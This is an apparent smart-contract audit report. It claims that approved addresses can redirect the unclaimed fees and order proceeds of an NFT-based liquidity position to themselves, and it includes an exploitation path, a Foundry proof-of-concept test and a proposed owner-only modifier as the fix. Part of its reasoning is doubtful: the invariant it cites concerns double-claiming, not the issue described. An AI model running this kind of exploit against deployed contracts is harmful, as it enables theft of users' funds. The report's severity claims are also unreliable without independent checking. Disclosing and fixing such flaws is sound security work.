## Title
Approved Addresses Can Steal Unclaimed Fees from NFT Positions

## Summary
The `collectFees()` function in `BasePositions` and `collectProceeds()` in `Orders` use the `authorizedForNft` modifier which allows both NFT owners and approved addresses to collect fees. This enables approved addresses to steal all unclaimed fees by specifying themselves as the recipient, violating the Fee Accounting invariant.

## Impact
**Severity**: High

## Finding Description

**Location:** `src/base/BasePositions.sol` (lines 110-116), `src/base/BaseNonfungibleToken.sol` (lines 81-86), `src/Orders.sol` (lines 107-114, 77-95) [1](#0-0) [2](#0-1) [3](#0-2) 

**Intended Logic:** The `authorizedForNft` modifier is intended to ensure only the NFT owner can perform privileged operations on their positions. ERC721 approval mechanisms are designed to allow transferring NFTs, not extracting value from them.

**Actual Logic:** The `authorizedForNft` modifier checks `_isApprovedOrOwner(msg.sender, id)`, which returns true for approved addresses. The `collectFees()` function accepts a `recipient` parameter, allowing approved addresses to redirect fees to any address, including themselves.

**Exploitation Path:**
1. Alice owns NFT #123 representing a liquidity position with 1,000 tokens in unclaimed fees
2. Alice approves Bob's address (e.g., listing on a marketplace, using a DeFi protocol, or trusting a helper contract)
3. Bob calls `collectFees(123, poolKey, tickLower, tickUpper, bob_address)` - note the recipient is Bob's address
4. The `authorizedForNft(123)` modifier passes because Bob has approval via `_isApprovedOrOwner()`
5. Core contract collects all accumulated fees and sends them to Bob's address per the `recipient` parameter
6. Alice loses all her unclaimed fees; Bob steals them

**Security Property Broken:** Violates the "Fee Accounting" invariant: "Position fee collection must be accurate and never allow double-claiming." Approved addresses should not be able to extract value (fees) from positions they don't own.

## Impact Explanation

- **Affected Assets**: All unclaimed fees in liquidity positions (BasePositions) and TWAMM order proceeds (Orders). Both token0/token1 fees in positions and purchased tokens in TWAMM orders are at risk.
- **Damage Severity**: Complete loss of all accumulated fees for the NFT owner. An attacker with approval can drain 100% of unclaimed fees to their own address.
- **User Impact**: Any user who grants approval to any address (marketplace contracts, DeFi protocols, aggregators, helper contracts, or even trusted individuals) becomes vulnerable. This affects all users utilizing NFT marketplaces or DeFi integrations.

## Likelihood Explanation

- **Attacker Profile**: Anyone who receives ERC721 approval from a position/order NFT owner. This includes marketplace contracts, DeFi protocol contracts, or malicious actors who convince users to grant approval.
- **Preconditions**: 
  - Victim must own an NFT position/order with accumulated unclaimed fees
  - Victim must grant approval to the attacker (via `approve()` or `setApprovalForAll()`)
  - Common scenarios: listing NFTs on marketplaces, using collateral in lending protocols, delegating management
- **Execution Complexity**: Single transaction - attacker simply calls `collectFees()` or `collectProceeds()` with their address as recipient
- **Frequency**: Can be exploited continuously as long as approval remains active and fees accumulate

## Recommendation

The `authorizedForNft` modifier should only be used for operations that don't extract value. For fee collection, implement a stricter modifier that requires the caller to be the NFT owner only:

```solidity
// In src/base/BaseNonfungibleToken.sol, add new modifier:

modifier onlyNftOwner(uint256 id) {
    if (msg.sender != _ownerOf(id)) {
        revert NotOwnerOfToken(msg.sender, id);
    }
    _;
}
```

Then in `src/base/BasePositions.sol`, replace `authorizedForNft` with `onlyNftOwner` for fee/value extraction functions:

```solidity
// Lines 110-116 - FIXED:
function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper, address recipient)
    public
    payable
    onlyNftOwner(id)  // Changed from authorizedForNft
    returns (uint128 amount0, uint128 amount1)
{
    (amount0, amount1) = withdraw(id, poolKey, tickLower, tickUpper, 0, recipient, true);
}
```

Similarly in `src/Orders.sol`:

```solidity
// Lines 107-114 - FIXED:
function collectProceeds(uint256 id, OrderKey memory orderKey, address recipient)
    public
    payable
    onlyNftOwner(id)  // Changed from authorizedForNft
    returns (uint128 proceeds)
{
    proceeds = abi.decode(lock(abi.encode(CALL_TYPE_COLLECT_PROCEEDS, id, orderKey, recipient)), (uint128));
}

// Lines 77-95 - FIXED:
function decreaseSaleRate(uint256 id, OrderKey memory orderKey, uint112 saleRateDecrease, address recipient)
    public
    payable
    onlyNftOwner(id)  // Changed from authorizedForNft
    returns (uint112 refund)
{
    // ... existing code
}
```

Keep `authorizedForNft` for operations like `deposit()` where approved addresses adding liquidity doesn't extract value from the owner.

## Proof of Concept

```solidity
// File: test/Exploit_ApprovedAddressFeeStealing.t.sol
// Run with: forge test --match-test test_approvedAddressCanStealFees -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./FullTest.sol";

contract Exploit_ApprovedAddressFeeStealing is FullTest {
    using CoreLib for *;
    
    address alice = address(0xA11CE);
    address bob = address(0xB0B);
    
    function test_approvedAddressCanStealFees() public {
        // SETUP: Alice creates a position and generates fees
        vm.startPrank(alice);
        token0.mint(alice, 1000 ether);
        token1.mint(alice, 1000 ether);
        token0.approve(address(positions), type(uint256).max);
        token1.approve(address(positions), type(uint256).max);
        
        PoolKey memory poolKey = createPool(0, 1 << 63, 100, CallPoints(0));
        (uint256 aliceNftId,,,) = positions.mintAndDeposit(poolKey, -100, 100, 100 ether, 100 ether, 0);
        vm.stopPrank();
        
        // Generate fees through swaps
        token0.mint(address(this), 10 ether);
        token0.approve(address(router), 10 ether);
        router.swap(
            RouteNode({poolKey: poolKey, sqrtRatioLimit: SqrtRatio.wrap(0), skipAhead: 0}),
            TokenAmount({token: address(token0), amount: 10 ether}),
            0
        );
        
        // Check accumulated fees
        (,,, uint128 fees0Before, uint128 fees1Before) = 
            positions.getPositionFeesAndLiquidity(aliceNftId, poolKey, -100, 100);
        assertGt(fees0Before, 0, "Fees should have accumulated");
        
        // Alice approves Bob (e.g., for marketplace listing or DeFi protocol)
        vm.prank(alice);
        positions.approve(bob, aliceNftId);
        
        // EXPLOIT: Bob steals the fees
        uint256 bobBalanceBefore = token1.balanceOf(bob);
        vm.prank(bob);
        (uint128 stolenAmount0, uint128 stolenAmount1) = 
            positions.collectFees(aliceNftId, poolKey, -100, 100, bob);
        
        // VERIFY: Bob received Alice's fees
        assertEq(stolenAmount1, fees1Before, "Bob stole all accumulated fees");
        assertEq(token1.balanceOf(bob), bobBalanceBefore + stolenAmount1, "Bob's balance increased");
        
        // Alice's fees are gone
        (,,, uint128 fees0After, uint128 fees1After) = 
            positions.getPositionFeesAndLiquidity(aliceNftId, poolKey, -100, 100);
        assertEq(fees1After, 0, "Alice's fees stolen - now zero");
        
        console.log("Vulnerability confirmed: Bob stole", stolenAmount1, "tokens from Alice");
    }
}
```

## Notes

This vulnerability also affects the `Orders` contract where `collectProceeds()` and `decreaseSaleRate()` have the same issue [4](#0-3) . Approved addresses can steal TWAMM order proceeds or refunds.

The root cause is the overly permissive use of `authorizedForNft` for value-extraction operations. ERC721 approvals are designed for NFT transfers, not for extracting accumulated value from the underlying position. This is a common vulnerability pattern in NFT-based financial protocols where the distinction between "can transfer the NFT" and "can extract value from it" is not properly enforced.

### Citations

**File:** src/base/BasePositions.sol (L110-116)
```text
    function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint128 amount0, uint128 amount1)
    {
        (amount0, amount1) = withdraw(id, poolKey, tickLower, tickUpper, 0, recipient, true);
```

**File:** src/base/BaseNonfungibleToken.sol (L81-86)
```text
    modifier authorizedForNft(uint256 id) {
        if (!_isApprovedOrOwner(msg.sender, id)) {
            revert NotUnauthorizedForToken(msg.sender, id);
        }
        _;
    }
```

**File:** src/Orders.sol (L77-95)
```text
    function decreaseSaleRate(uint256 id, OrderKey memory orderKey, uint112 saleRateDecrease, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint112 refund)
    {
        refund = uint112(
            uint256(
                -abi.decode(
                    lock(
                        abi.encode(
                            CALL_TYPE_CHANGE_SALE_RATE, recipient, id, orderKey, -int256(uint256(saleRateDecrease))
                        )
                    ),
                    (int256)
                )
            )
        );
    }
```

**File:** src/Orders.sol (L107-114)
```text
    function collectProceeds(uint256 id, OrderKey memory orderKey, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint128 proceeds)
    {
        proceeds = abi.decode(lock(abi.encode(CALL_TYPE_COLLECT_PROCEEDS, id, orderKey, recipient)), (uint128));
    }
```
